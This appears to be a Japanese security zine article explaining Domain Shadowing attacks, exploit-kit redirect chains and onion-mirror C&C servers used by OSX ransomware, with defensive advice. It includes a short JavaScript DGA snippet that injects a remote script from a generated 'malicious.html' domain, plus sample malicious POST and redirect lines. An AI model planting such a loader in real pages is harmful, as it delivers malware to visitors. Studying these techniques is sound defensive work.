@@ -1,0 +1,163 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: Domain Shadowing攻撃とC&Cの考察 ---
+
+著者：黒林檎
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 最初に
+
+　お久しぶりです、黒林檎です。今回は、コンピュータウイルスにおける補助的な攻撃のお話をさせて頂きます。
+　これ以外に、IoTハッキングを書きたかったですが事例的にも管理者APIの未認証などの問題しか書けそうになかったので今回は時期改め、それ以外ではOWASP ZAP APIを使用したウェブ診断便利ツールの作成など書きたかったのですが、いろいろやってる最中にOSXのランサムウェアやDomain Shadowingといった物に触れまして、マルウェアにおける補助的な攻撃という事でDomain ShadowingとC&Cについて簡単に書かせて頂きたいと思います。
+
+
+■0x02.) Domain Shadowing攻撃とは?
+
+　Domain Shadowing攻撃とは、簡単に言うと他人のドメインアカウントの資格情報を盗み取り(DNSレコードをハッキングし)サブドメインを大量に生成する攻撃です。
+　目的としてはドメインを対象にした検知を回避する目的があります。また、この方法では、攻撃者は”ほぼ無限”にドメインを生成できるというメリットがあります。
+
+　Domain Shadowing攻撃を”ruffnex.oc.to“を用いて説明させていただきます。
+
+○domain shadowing図解
+
+/****************************/ ===>  /****************************/
+/*      ruffnex.oc.to       */ ===>  /*   133.242.147.127(Japan) */
+/****************************/ ===>  /****************************/
+
+/****************************/ ===>  /****************************/
+/* malicious.ruffnex.oc.to  */ ===>  /*  133.242.147.127(Chaina) */
+/****************************/ ===>  /****************************/
+
+　という様に、”ruffnex.oc.to”のDNSレコードを乗っ取ってしまったのであればサブドメインなど生成せずに”ruffnex.oc.to”のレコードも書き換えて使えば良いじゃないか?!と思うかもしれませんが、この攻撃はドメイン所有者が頻繁にDNSレコードを確認していないという人間の脆弱性の様な物をついて成り立つため、管理者が頻繁に確認する様な(元々登録されているDNSレコード)は書き換えないというのがこの攻撃のポイントです。
+
+　これとDomain Shadowingに似た攻撃方法として、Fast-Flax攻撃が存在します。
+　それでは、その2つはどの様な違いがあるのでしょうか?
+
+・Fast-Flax攻撃
+　1つのドメインに対して、複数のIPを割り当てます。そして、TTL値を短くし短い時間でIPを切り替えていきます。よって、IPベースの検知を回避する目的があります。
+
+・Domain Shadowing攻撃
+　DGAの様な仕組みで複数のサブドメインを作成し、IPを割り当てます。この攻撃では、ドメインベースの検知を回避する目的があります。
+
+　Exploit-kitなどで用いられている、DGAなどで Domain shadowingで生成したドメインを生成します。DGAの例として、日付を用いたDGAも存在します。私的ですが、日付を用いたDGAは多く見受けます。
+
+-----  日付を用いたDGA
+function runonload(){
+	if(!document.body){
+		setTimeout(runonload,50);
+	}else{
+		var s = document.createElement("SCRIPT");
+		s.src = "http://" + hashdate().toString(16) + “.jp/malicious.html?" + Math.random();
+		document.body.appendChild(s);
+	}
+};
+-----
+
+　これ以外では、”malicious.ruffnex.oc.to”になる様に配列に文字列を保持し、サブドメインを生成する様仕組み用いるDGAなどもあります。
+　DGA自体は多種多様な方法があるので、これと言った方法はありません。
+
+
+■0x03.) Domain shadowing攻撃の流れ
+
+　話を戻して、Domain shadowing攻撃の流れですが、図解では以下のような流れです。
+
+[*1]                                  [*2]                                       [*3]
+/****************************/ ===>  /***********************************/ ===> /*********************************/
+/*    不正な広告ページなど  */ ===>  /*      malicious.ruffnex.oc.to    */ ===> /*  ランディングページ(exploitページ) */
+/****************************/ ===>  /***********************************/ ===> /*********************************/
+
+●各ページの説明
+
+　各ページについて説明します。
+
+○[*1]
+
+　不正な広告ページはもちろん、javaScriptは難読化されており、iframe自体もユーザーには見えない様にされています。その広告ページは、主にDomain shadowingページへPOSTを飛ばす役割をします。
+　POSTでは、認証キーのような物を投げます。
+
+-----
+POST http://malicious.ruffnex.oc.to/ladrien.html HTTP/1.1
+…
+Host: malicious.ruffnex.oc.to
+Pragma: no-cache
+
+認証キー:hogehoge
+-----
+
+○[*2]
+　広告ページより、認証キーのPOSTを受け以下の様なリクエストを返します。
+
+-----
+<meta http-equiv=“REFRESH” content=“0;url=ランディングページへ“>
+-----
+
+○[*3]
+
+　最終的に広告ページから、目的のランディングページ(exploitなどを行うページ)に転送され攻撃が実行されます。
+
+●ドメインを切り替えるタイミング
+
+　ドメインなどを切り替えるタイミングですが、av checkようなオンラインサービスなどを用います。
+　解析者により検知サービスにドメインがブラックリストに入れられたかなどを定期的に調べます。もしブラックリストに入れられた際に、ドメインを切り替えます。
+
+参考Link:http://avdetect.com/
+
+●Domain Shadowing攻撃の対策
+
+　Domain Shadowingは、単純にユーザーを騙して管理パネルにアクセスするため、多くはフィッシングのような初歩的な攻撃技術が使用されます。よって、この攻撃に対しての対策としては以下が挙げられています。
+
+・2段階認証を用いる。
+・DNSレコードなどの変更後に電子メールする。
+
+　以上で、Domain Shadowingについての概要を終え、C&Cで面白かった事を簡単ですがまとめさせて頂きたいと思います。
+
+■0x04.) C&Cについて
+
+　最近、OSXを狙ったランサムウェアが話題になりました。主に”OSX”というのが騒がれていましたが、そこに使用されていた物が個人的に目新しい技術でしたので紹介します。OSXランサムウェアのC&CサーバーでONIONサーバーですが、少し違います。
+
+/////////////////////////////////////////
+[onion ミラーなリンク]
+lclebb6kvohlkcml*]onion[*]link
+lclebb6kvohlkcml*]onion[*]nu
+/////////////////////////////////////////
+onionアドレスは、[半角英数*16].onionなアドレスでtor proxyを経由する事でアクセスできる物です。
+また、”.onion”は擬似TLDであり、tor proxyを経由しなければアクセスする事が出来ません。
+しかし、このC&Cに使用されているサーバーを”onionミラー”と呼ぶとして、これはは”.onion”とウェブとの間のリンクのような仕組みです。
+torの様に通信を暗号化する様な仕組みではないですが、サーバー自体の匿名性は保持したままになります。
+
+/////////////////////////////////////////
+[onion ミラーをnslookupした結果*ipに注目]
+$nslookup auutwvpt2zktxwng.onion.link
+Non-authoritative answer:
+Name:	auutwvpt2zktxwng.onion.link
+Address: 103.198.0.2
+
+$nslookup hackerrljqhmq6jb.onion.link
+
+Non-authoritative answer:
+Name:	hackerrljqhmq6jb.onion.link
+Address: 103.198.0.2
+/////////////////////////////////////////
+
+　この様なC&Cサーバーとしてこの様な物を使われているnoha。初めて見たため驚きました。これからマルウェアの補助的な技術としてどの様な技銃が増えていくのか気になるところです。
+
+
+●Domain Shadowing参考リンク
+
+http://blogs.cisco.com/security/talos/angler-domain-shadowing
+https://blogs.sophos.com/2015/07/21/a-closer-look-at-the-angler-exploit-kit/
+https://blog.malwarebytes.org/malvertising-2/2015/04/domain-shadowing-with-a-twist/
+http://en.wooyun.io/2016/03/16/45.html
+https://nakedsecurity.sophos.com/2012/11/23/hacked-go-daddy-ransomware/
+
+●Onionミラー参考URL
+
+http://www.onion.link/faq.html
+https://tor2web.org/
+
+
+
